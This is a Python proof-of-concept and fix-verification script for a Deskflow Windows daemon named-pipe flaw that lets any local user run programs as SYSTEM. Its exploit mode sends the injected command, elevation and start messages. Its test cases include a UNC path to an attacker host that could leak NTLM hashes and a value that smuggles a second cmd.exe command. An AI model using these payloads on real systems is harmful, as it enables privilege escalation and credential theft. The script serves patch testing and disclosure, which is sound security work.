#!/usr/bin/env python3
"""
CVE-2026-41477 — Deskflow daemon IPC privilege escalation.

The Deskflow daemon on Windows runs as SYSTEM and exposes a world-accessible
Qt named pipe (`deskflow-daemon`). Pre-fix it accepted:

    command=<arbitrary exe + args>
    elevate=yes
    start

…causing the daemon to spawn the attacker-supplied executable as SYSTEM.
Any local user could escalate to SYSTEM.

Post-fix (commits 44affec5e2 / c338b5797d / 5d7c1e30d6):
  - `command=` and `elevate=` IPC messages were removed.
  - The sole replacement is `configFile=<path>`; the daemon reads the
    command/mode/elevate settings *from* that INI file.
  - The path must pass QFileInfo::exists() before being applied.
  - Screen enter/leave commands are de-elevated to the session user token.

This script has two modes:

    --mode exploit
        Reproduces the old vulnerability. Run against a master-branch daemon
        (vulnerable) — you should see the payload execute as SYSTEM.

    --mode fix-test
        Probes the fix: confirms `command=` is gone (case A), UNC paths in
        `configFile=` are rejected before `QFileInfo::exists()` can trigger
        SMB auth from the SYSTEM-context daemon (case B), and that shell-style
        command smuggling via `configFile=` has no effect (case C).

    --mode auto (default)
        Probes the daemon once and picks: pre-fix → exploit, post-fix → fix-test.
"""

import argparse
import os
import socket
import sys
import time

PIPE_NAME = "deskflow-daemon"

if os.name == "nt":
    import ctypes
    import ctypes.wintypes as wt
    import msvcrt

    _kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    _PeekNamedPipe = _kernel32.PeekNamedPipe
    _PeekNamedPipe.argtypes = [
        wt.HANDLE, ctypes.c_void_p, wt.DWORD,
        ctypes.POINTER(wt.DWORD), ctypes.POINTER(wt.DWORD), ctypes.POINTER(wt.DWORD),
    ]
    _PeekNamedPipe.restype = wt.BOOL

    def _pipe_bytes_available(handle):
        avail = wt.DWORD(0)
        ok = _PeekNamedPipe(handle, None, 0, None, ctypes.byref(avail), None)
        return int(avail.value) if ok else -1

    def _enable_vt():
        # Legacy cmd.exe won't interpret ANSI unless VT processing is on.
        # Windows Terminal / VS Code already handle it, so this is a no-op there.
        try:
            h = _kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
            mode = wt.DWORD()
            if _kernel32.GetConsoleMode(h, ctypes.byref(mode)):
                _kernel32.SetConsoleMode(h, mode.value | 0x0004)  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
        except OSError:
            pass
else:
    def _enable_vt():
        pass


_GREEN, _RED, _YELLOW, _GRAY, _RESET = "\033[32m", "\033[31m", "\033[33m", "\033[90m", "\033[0m"
_PASS = f"{_GREEN}[PASS]{_RESET}"
_FAIL = f"{_RED}[FAIL]{_RESET}"
_CHECK = f"{_YELLOW}[CHECK LOG]{_RESET}"
_NA = f"{_GRAY}[N/A]{_RESET}"


def _verdict(ok, msg):
    """ok=True -> green PASS, ok=False -> red FAIL, ok=None -> yellow CHECK LOG."""
    marker = _PASS if ok is True else _FAIL if ok is False else _CHECK
    print(f"         {marker} {msg}")


def _verdict_na(msg):
    print(f"         {_NA} {msg}")


def _wait_for_file(path, timeout=6.0, interval=0.2):
    """Poll for path to exist; return True as soon as it does.

    Needed because the daemon's watchdog may be in backoff from prior failures
    and won't spawn the command for a second or two. A single sleep(1.5) can
    race and miss the spawn, giving a false PASS on case A.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if os.path.exists(path):
            return True
        time.sleep(interval)
    return False


def _detect_branch(version_id):
    """Return 'post-fix' if `configFile=` is wired up, 'pre-fix' otherwise.

    Probe: send an empty `configFile=`. On the fix branch this hits the
    empty-path check in DaemonIpcServer.cpp:81 and replies 'error'. On
    pre-fix there's no handler — the daemon logs 'unknown command' and
    sends no reply.
    """
    try:
        with connect_and_handshake(version_id) as c:
            c.send("configFile=")
            reply = c.recv_line(timeout=1.0)
    except Exception:  # noqa: BLE001
        return None
    return "post-fix" if "error" in (reply or "").lower() else "pre-fix"


_REJECT_WORDS = ("unknown command", "does not exist", "invalid", "error")


def _log_size(path):
    if not path:
        return 0
    try:
        return os.path.getsize(path)
    except OSError:
        return 0


def _log_tail(path, start):
    if not path:
        return ""
    try:
        with open(path, "rb") as f:
            f.seek(start)
            return f.read().decode("utf-8", errors="replace")
    except OSError:
        return ""


def _print_tail(tail, max_lines=6):
    lines = [ln for ln in tail.splitlines() if ln.strip()]
    for ln in lines[-max_lines:]:
        print(f"         > {ln}")


def _rejected(tail):
    low = tail.lower()
    return any(w in low for w in _REJECT_WORDS)


def _post_case_log(log_path, pre_size, expect_reject=True, flush_delay=0.25, na=False):
    """Read the log tail since pre_size, print it, and emit a verdict.

    If na=True, emit [N/A] (case not applicable to the detected daemon branch).
    If expect_reject=True, rejection keywords in the tail → PASS.
    If expect_reject=False, absence of rejection keywords → PASS.
    """
    time.sleep(flush_delay)
    tail = _log_tail(log_path, pre_size)
    _print_tail(tail)
    if na:
        _verdict_na("fix-branch case; not applicable on pre-fix daemon.")
        return
    if not log_path:
        _verdict(None, "no log path; cannot verify from daemon log.")
        return
    rejected = _rejected(tail)
    if expect_reject:
        _verdict(rejected, "log shows rejection." if rejected else "no rejection keywords in log tail.")
    else:
        _verdict(not rejected, "no rejection keywords — accepted as expected." if not rejected else "unexpected rejection keywords.")


def _query_log_path(version_id):
    try:
        with connect_and_handshake(version_id) as c:
            c.send("logPath")
            reply = c.recv_line(timeout=1.0)
    except Exception:  # noqa: BLE001
        return None
    if reply.startswith("logPath="):
        return reply.split("=", 1)[1].strip() or None
    return None


class IpcClient:
    """Line-oriented client for Qt's QLocalServer.

    On Windows the server is a named pipe; on Linux/macOS it's AF_UNIX. The
    wire protocol is newline-delimited UTF-8 `command=arg1=arg2=...` lines.

    Reads poll with a short interval so Ctrl+C is responsive even when the
    server never replies (as with unknown commands)."""

    def __init__(self, timeout=3.0):
        self._timeout = timeout
        if os.name == "nt":
            self._f = open(r"\\.\pipe\{}".format(PIPE_NAME), "r+b", buffering=0)
            self._sock = None
        else:
            runtime = os.environ.get("XDG_RUNTIME_DIR", "/tmp")
            self._sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self._sock.settimeout(timeout)
            self._sock.connect(os.path.join(runtime, PIPE_NAME))
            self._f = None

    def send(self, message):
        data = (message + "\n").encode("utf-8")
        if self._f:
            self._f.write(data)
            self._f.flush()
        else:
            self._sock.sendall(data)

    def recv_line(self, timeout=None):
        """Read one \\n-terminated line, or return '' on timeout.

        Polls in small ticks so KeyboardInterrupt is honoured promptly even
        on Windows (where a bare pipe read() is non-interruptible)."""
        if timeout is None:
            timeout = self._timeout
        deadline = time.monotonic() + timeout

        if self._f:
            h = msvcrt.get_osfhandle(self._f.fileno())
            buf = bytearray()
            while time.monotonic() < deadline:
                avail = _pipe_bytes_available(h)
                if avail > 0:
                    chunk = self._f.read(min(avail, 4096))
                    if not chunk:
                        break
                    buf.extend(chunk)
                    if b"\n" in buf:
                        line, _, _ = buf.partition(b"\n")
                        return line.decode("utf-8", errors="replace")
                else:
                    time.sleep(0.05)
            return bytes(buf).decode("utf-8", errors="replace").rstrip("\n")

        self._sock.settimeout(timeout)
        buf = b""
        try:
            while not buf.endswith(b"\n"):
                chunk = self._sock.recv(1)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        return buf.decode("utf-8", errors="replace").rstrip("\n")

    def close(self):
        try:
            if self._f:
                self._f.close()
            if self._sock:
                self._sock.close()
        except OSError:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


def discover_version():
    """Provoke a version-mismatch error and parse the expected version out of it."""
    with IpcClient() as c:
        c.send("hello=0.0.0+0000000")
        reply = c.recv_line(timeout=2.0)
    marker = "expected: "
    if marker in reply:
        return reply.split(marker, 1)[1].strip()
    return None


def connect_and_handshake(version_id):
    c = IpcClient()
    c.send(f"hello={version_id}")
    reply = c.recv_line(timeout=2.0)
    if not reply.startswith("hello="):
        c.close()
        raise RuntimeError(f"handshake failed: {reply!r}")
    return c


def send_and_print(client, message, label, read_timeout=0.75):
    print(f"    >> {label}: {message!r}")
    client.send(message)
    reply = client.recv_line(timeout=read_timeout)
    print(f"    << {reply!r}" if reply else "    << <no reply>")
    return reply


# ---------------------------------------------------------------------------
# Mode: exploit — run against master / pre-fix daemon
# ---------------------------------------------------------------------------

def mode_exploit(version_id, payload_exe, evidence_path):
    """Reproduce the pre-fix vulnerability end-to-end."""
    print("=" * 70)
    print("MODE: exploit  —  targets the pre-fix (vulnerable) daemon")
    print("=" * 70)
    print(f"Payload: {payload_exe}")
    print("Expected on pre-fix:  FAIL — daemon spawns payload as SYSTEM.")
    print("Expected on post-fix: PASS — legacy `command=` is unknown, nothing spawned.\n")

    log_path = _query_log_path(version_id)
    if log_path:
        print(f"[*] Daemon log: {log_path}")

    if evidence_path:
        try:
            os.remove(evidence_path)
        except OSError:
            pass

    pre = _log_size(log_path)
    with connect_and_handshake(version_id) as c:
        send_and_print(c, f"command={payload_exe}", "inject command")
        send_and_print(c, "elevate=yes", "request elevation")
        send_and_print(c, "start", "start watchdog")

    if evidence_path is None:
        _print_tail(_log_tail(log_path, pre))
        _verdict(None, "custom --payload-exe supplied; cannot auto-verify. Inspect log/system state.")
        return

    # See case A in mode_fix_test: watchdog backoff can delay the spawn, so poll.
    _wait_for_file(evidence_path, timeout=15.0)
    _print_tail(_log_tail(log_path, pre))

    if os.path.exists(evidence_path):
        _verdict(False, f"privesc confirmed — evidence file created by daemon: {evidence_path}")
        try:
            with open(evidence_path, encoding="utf-8", errors="replace") as f:
                for line in f.read().splitlines()[:12]:
                    print(f"         | {line}")
        except OSError as e:
            print(f"         !! read failed: {e}")
        try:
            os.remove(evidence_path)
        except OSError:
            pass
    elif _detect_branch(version_id) == "pre-fix":
        _verdict(None, "no evidence file within 15s but daemon is pre-fix — likely in watchdog backoff. Re-run.")
    else:
        _verdict(True, "no evidence file — legacy `command=` was rejected.")


# ---------------------------------------------------------------------------
# Mode: fix-test — run against fix branch
# ---------------------------------------------------------------------------

def _fix_case(version_id, title, messages, expectation):
    print(f"\n  [case] {title}")
    print(f"         expected: {expectation}")
    replies = []
    try:
        with connect_and_handshake(version_id) as c:
            for label, msg in messages:
                replies.append(send_and_print(c, msg, label))
    except Exception as e:  # noqa: BLE001
        print(f"         !! aborted: {e}")
        return None
    return replies


def mode_fix_test(version_id):
    """Injection battery against the new configFile= IPC command."""
    print("=" * 70)
    print("MODE: fix-test  —  probes the new configFile= command for bypasses")
    print("=" * 70)
    print("Each case should be rejected or have no privileged effect.\n")

    log_path = _query_log_path(version_id)
    if log_path:
        print(f"[*] Daemon log: {log_path}")
    else:
        print("[!] Could not query daemon logPath; per-case checks will show [CHECK LOG].")

    branch = _detect_branch(version_id)
    pre_fix = branch == "pre-fix"
    if pre_fix:
        print("[!] Pre-fix daemon detected — `configFile=` is not wired up here.")
        print("    Case A probes this daemon directly; cases B and C will be marked [N/A].\n")
    elif branch == "post-fix":
        print("[*] Post-fix daemon detected — `configFile=` is handled.\n")
    else:
        print("[!] Could not probe daemon; running battery anyway.\n")

    # Elevation probe: if `command=` still works, the daemon spawns cmd.exe
    # as SYSTEM and `whoami /all` dumps identity + integrity level into
    # evidence_path. A message box would be invisible here — the daemon runs
    # in Session 0, so any GUI it spawns lands on the non-interactive desktop.
    evidence_path = rf"C:\Windows\Temp\deskflow_elev_check_{os.getpid()}.txt"
    try:
        os.remove(evidence_path)
    except OSError:
        pass

    pre = _log_size(log_path)
    _fix_case(
        version_id,
        "A. legacy `command=` should no longer exist",
        [
            ("elevation check", rf'command=C:\Windows\System32\cmd.exe /c whoami /all > "{evidence_path}"'),
            ("legacy elevate", "elevate=yes"),
            ("start", "start"),
        ],
        "server logs 'unknown command'; no process spawned; no evidence file.",
    )
    # Poll (up to 15s) because the watchdog may be in start-failure backoff from
    # prior runs: a previous spawn can sit in the kill-timeout (10s) before the
    # next retry even fires. A short sleep here races the retry and misses the
    # spawn entirely.
    _wait_for_file(evidence_path, timeout=15.0)
    _print_tail(_log_tail(log_path, pre))
    if os.path.exists(evidence_path):
        _verdict(False, f"privesc confirmed — evidence file created by daemon: {evidence_path}")
        try:
            with open(evidence_path, encoding="utf-8", errors="replace") as f:
                for line in f.read().splitlines()[:12]:
                    print(f"         | {line}")
        except OSError as e:
            print(f"         !! read failed: {e}")
        try:
            os.remove(evidence_path)
        except OSError:
            pass
    elif pre_fix:
        # On pre-fix, `command=` is still a known handler and the watchdog did
        # try to spawn (the log shows 'process immediately stopped' retries).
        # Missing evidence file here means our poll window raced the backoff,
        # not that the daemon rejected anything. Don't claim PASS.
        _verdict(None, "command= was accepted but no evidence file within 15s — daemon likely in backoff. Re-run.")
    else:
        _verdict(True, "no evidence file — legacy `command=` was rejected.")

    # Case B: a UNC in configFile= would, unfixed, cause QFileInfo::exists()
    # in DaemonApp::applyWatchdogCommand to trigger SMB auth from the SYSTEM
    # daemon — leaking the machine NTLM hash to attacker-controlled hosts.
    # The fix rejects paths starting with `\\` or `//` before the existence
    # check, so this case should see a "remote config file paths are not
    # allowed" rejection in the log.
    pre = _log_size(log_path)
    _fix_case(
        version_id,
        "B. UNC in configFile= is rejected before QFileInfo::exists",
        [
            ("unc", r"configFile=\\evil-host\share\payload.ini"),
            ("start", "start"),
        ],
        "daemon rejects UNC without calling QFileInfo::exists (no SMB auth, no NTLM leak).",
    )
    _post_case_log(log_path, pre, na=pre_fix)

    # Case C: demonstrate that command smuggling via configFile= does not
    # work. The path is interpolated into "<core>" server --settings "<path>"
    # at DaemonApp.cpp:85 and passed to CreateProcess directly — no shell is
    # involved, so `&`, `;`, backticks, `$(...)` are literal. The payload
    # prefixes a real, plausible config path with `& cmd /c whoami /all > ev`
    # so if the spawn ever goes through cmd/sh/pwsh, or the outer quoting
    # around <path> is dropped in a refactor, the second command would run
    # and write the evidence file. We verdict on the evidence file so the
    # test trips whether the regression is in the existence check or the
    # spawn path.
    smuggle_ev = rf"C:\Windows\Temp\deskflow_shell_smuggle_{os.getpid()}.txt"
    try:
        os.remove(smuggle_ev)
    except OSError:
        pass

    valid_config = (log_path or r"C:\Windows\System32\drivers\etc\hosts").replace("/", "\\")
    smuggle_payload = (
        f'configFile={valid_config} & C:\\Windows\\System32\\cmd.exe '
        f'/c whoami /all > "{smuggle_ev}"'
    )

    pre = _log_size(log_path)
    _fix_case(
        version_id,
        "C. shell-style command smuggle via configFile=",
        [
            ("cmd-chain", smuggle_payload),
            ("start", "start"),
        ],
        "no evidence file appears (no shell involved; path also rejected by existence check).",
    )
    _wait_for_file(smuggle_ev, timeout=5.0)
    _print_tail(_log_tail(log_path, pre))
    if os.path.exists(smuggle_ev):
        _verdict(False, f"shell smuggle confirmed — evidence file created: {smuggle_ev}")
        try:
            os.remove(smuggle_ev)
        except OSError:
            pass
    elif pre_fix:
        _verdict_na("fix-branch case; configFile= not handled on pre-fix daemon.")
    else:
        _verdict(True, "no evidence file — path not shell-interpreted, smuggle blocked.")


# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--mode", choices=("auto", "exploit", "fix-test"), default="auto")
    ap.add_argument(
        "--payload-exe",
        default=None,
        help="Command used in --mode=exploit for the legacy `command=` message. "
             "Defaults to a `whoami` redirect whose output path is auto-verified.",
    )
    ap.add_argument(
        "--version",
        help="Handshake version+gitsha (e.g. 1.22.0+abcdef1). Auto-detected if omitted.",
    )
    args = ap.parse_args()
    _enable_vt()

    print(f"[*] Target pipe: {PIPE_NAME}")

    version_id = args.version or discover_version()
    if not version_id:
        print("[!] Could not determine daemon version — is the daemon running?")
        return 2
    print(f"[*] Handshake version: {version_id}\n")

    mode = args.mode
    if mode == "auto":
        branch = _detect_branch(version_id)
        if branch == "pre-fix":
            mode = "exploit"
        elif branch == "post-fix":
            mode = "fix-test"
        else:
            print("[!] Could not detect daemon branch — pass --mode exploit or --mode fix-test explicitly.")
            return 2
        print(f"[*] Auto-detected daemon branch: {branch} — running --mode {mode}\n")

    if mode == "exploit":
        if args.payload_exe:
            payload_exe, evidence_path = args.payload_exe, None
        else:
            evidence_path = rf"C:\Windows\Temp\deskflow_privesc_{os.getpid()}.txt"
            payload_exe = rf'C:\Windows\System32\cmd.exe /c whoami > "{evidence_path}"'
        mode_exploit(version_id, payload_exe, evidence_path)
    elif mode == "fix-test":
        mode_fix_test(version_id)

    # Signing off — leaves a harmless "unknown command: meow" warning in the
    # daemon log as a calling card (handled by IpcServer::processCommand's
    # default branch at DaemonIpcServer.cpp:48).
    try:
        with connect_and_handshake(version_id) as c:
            c.send("meow")
    except Exception:  # noqa: BLE001
        pass

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(130)
